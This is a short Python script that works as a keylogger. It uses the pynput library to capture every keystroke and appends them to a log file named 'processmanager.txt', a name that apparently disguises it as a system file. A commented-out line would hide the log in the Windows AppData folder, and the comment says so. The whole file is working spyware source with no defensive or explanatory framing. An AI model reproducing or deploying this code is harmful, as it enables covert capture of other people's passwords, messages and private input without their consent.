import os
from pynput.keyboard import Listener

keys=[]
count=0
#path=os.environ['appdata']+'processmanager.txt'  #hides data inside appdata this line is used in windows only
path='processmanager.txt'

def on_press(key):  #record key strokes one by one
    global keys, count
    keys.append(key)
    count+=1
    if (count>-1):
        count=1
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(path,'a') as rfile:
        for key in keys:
            k=str(key).replace("'","")  # all keys will be separated by single quote by default on pynput so we use this to avoid that
            if k.find('backspace')>0:   #resolving special characters
                rfile.write(' Backspace ')
            elif k.find('enter')>0:
                rfile.write('\n')
            elif k.find('shift')>0:
                rfile.write(' shift ')
            elif k.find('space')>0:
                rfile.write(' ')
            elif k.find('caps_lock')>0:
                rfile.write(' caps_lock ')
            elif k.find('num_lock')>0:
                rfile.write(' num_lock ')
            elif k.find(key):
                rfile.write(k)
            
            

with Listener(on_press=on_press) as listener:
    listener.join()
